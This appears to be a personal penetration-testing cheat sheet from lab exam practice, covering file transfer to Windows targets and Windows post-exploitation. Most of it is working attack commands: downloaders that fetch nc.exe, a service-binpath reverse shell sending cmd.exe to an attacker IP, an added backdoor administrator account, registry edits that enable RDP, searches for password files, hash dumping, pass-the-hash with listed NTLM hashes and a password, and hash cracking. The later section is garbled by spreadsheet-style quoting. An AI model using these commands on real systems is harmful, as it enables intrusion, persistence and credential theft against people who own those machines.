
## File Transfer
Below methos can be used to transfer files..

## Transferring Files to Windows	## 
-**Running Webserver on Kali**
```
python -m SimpleHTTPServer 8080	
```
-**Transfer with Netcat**
```
//Kali
nc -lvp 1234 > zeroday.txt
//Win 
nc 192.168.0.114 1234 < zero-day.txt
```
ref: https://blog.ropnop.com/transferring-files-from-kali-to-windows/

-**TFTP** <br />
If target has tftp running, you can easily check it by typing tftp on windows cmd. 
Starting tftp service : 
```
atftpd --daemon --port 69 /tftp 
/etc/init.d/atftpd restart
cd /srv/tftp
cp /var/www/html/nc.exe .
```

```
//transfer nc.exe  
tftp -i 10.11.0.42 GET nc.exe
//PUT
tftp -i 10.11.0.42 PUT test.txt
```

-**FTP** <br />
Setup FTP service by downloading pyftp library 
```
apt-get install python-pyftpdlib  
python -m pyftpdlib -p 21 -w
```
You can also automate ftp process by creating ftp.txt
```
echo open 10.11.0.42>ftp.txt
echo anonymous>>ftp.txt
echo password>>ftp.txt
echo binary>>ftp.txt
echo get nc.exe>>ftp.txt 
echo bye>>ftp.txt
ftp -s:ftp.txt
```

cf.	Setting FTP
```sh
groupadd ftpgroup 
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome 
pure-pw mkdb 
cd /etc/pure-ftpd/auth/ 
ln -s ../conf/PureDB 60pdb 
mkdir -p /ftphome 
chown -R ftpuser:ftpgroup /ftphome/ 
/etc/init.d/pure-ftpd restart
```

```
root@kali:~# chmod 755 setup-ftp 
root@kali:~# ./setup-ftp 
Password: 
Enter it again: 
Restarting ftp server
```

-**Creating VBscript** <br />
wget.vbs * VBScript  (eg. in Windows XP, 2003) 
```sh

echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

```
**Usgage**  : ```cscript wget.vbs http://10.11.0.42/wget.exe wget.exe```


-**PowerShell-** (in Windows 7, 2008, and above) 	 <br />
wget.ps1
```sh
echo $storageDir = $pwd > wget.ps1 
echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = "http://10.11.0.42/nc.exe" >>wget.ps1 
echo $file = "nc.exe" >>wget.ps1 
echo $webclient.DownloadFile($url,$file) >>wget.ps1 
```
**Usgage**  : ```powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive NoProfile -File wget.ps1```


# Post Exploit - Windows	
 
- **Checking OS Details** 
```
systeminfo 
findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

- **64 or 86 Checking **
```
wmic os get osarchitecture
```
or check "System Files" like belows 
```
//C:\Windows\System32\license.rtf for Windows 7. 
//C:\Windows\System32\eula.txt for Windows XP
cd "C:/WINDOWS/inf/layout.inf" && cat layout.inf |grep productname
```

System32        C:\Windows\System32        Windows System folder (system directory) for 64-bit files
SysWOW64        C:\Windows\SysWOW64        Windows System folder (system directory) for 32-bit files

ref : http://www.samlogic.net/articles/32-64-bit-windows-folder-x86-syswow64.htm

- **Find Sensitive Files **
Find password	
```
findstr /si password *.xml *.ini *.txt
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /spin ""password"" *.*"
```

- **Adding Local User **
Net commad
```
net user susu gothacked /add
net localgroup Administrators susu /add
```
If target has RDP service running, you may able to RDP into target; ```rdesktop -u susu -p gothacked 10.11.1.31```

- **Enable RDP service on Target **
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
NET LOCALGROUP "Remote Desktop Users" robert /ADD
NET LOCALGROUP "Remote Desktop Users" susu /ADD
```
If target has RDP service running, you may able to RDP into target; ```rdesktop -u susu -p gothacked 10.11.1.31```

- **AccessChck**

accesschk.exe
Guide : http://www.fuzzysecurity.com/tutorials/16.html"	"Old version : https://xorcat.net/assets/other/Accesschk.zip
https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula/
accesschk.exe -qwsu ""Users"" *
https://docs.google.com/document/d/16WpxAa2vI6RbJrd42lZy3TM23ehwl_lY-zfRhYO9MbY/edit"
sc config	"sc config upnphost binpath= ""C:\Inetpub\Scripts\nc.exe -nv 10.11.0.45 7878 -e C:\WINDOWS\System32\cmd.exe""
sc config upnphost obj= "".\LocalSystem"" password= """"
sc config ssdpsrv start= demand"
Proof.txt	"echo %username%
whoami
ipconfig
more ""C:\Documents and Settings\Administrator\Desktop\proof.txt""
type ""C:\Documents and Settings\Administrator\Desktop\proof.txt""
type ""C:\Documents and Settings\Administrator\Desktop\proof.txt"""
"PTH
https://xapax.gitbooks.io/security/content/pass_the_hash_-_reusing_hashes.html?q=
https://www.kali.org/penetration-testing/passing-hash-remote-desktop/"	"1. RDP with Hash value
xfreerdp /u:""kevin"" /d:master.thinc.local /pth:aad3b435b51404eeaad3b435b51404ee:aef3d57f355a02297fc386630a01449e /v:10.11.1.220
password : !QW@3er45t
xfreerdp /u:""administrator"" /d:master.thinc.local /pth:aad3b435b51404eeaad3b435b51404ee:0598acedc0122622ad85afc9e66d329e /v:10.11.1.220
password : (gotta set the password after passing the smb hash)
2. SMB export hash value
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:0598acedc0122622ad85afc9e66d329e
pth-winexe -U Administrator% //10.11.1.220 cmd"
"After Exploit
Dump pwd"	fgdump.exe 
NTLM Decrypt	"john ./pwlist.txt --format=nt --wordlist=/pentest/passwords/wordlists/rockyou.txt
http://www.madhur.co.in/blog/2011/09/18/crackresetwindows.html
https://hashkiller.co.uk/ntlm-decrypter.aspx"
	
PsExec	https://pinkysplanet.net/escalating-privileges-in-windows-with-psexec-and-netcat/
	
Pass the HASH	"1. put the hash in the environment variable with export command
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:0598acedc0122622ad85afc9e66d329e
2. authenticate SMB's cred
pth-winexe -U Administrator% //10.11.1.220 cmd

export SMBHASH=aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE

pth-winexe -U Administrator% //10.11.1.49 cmd
"
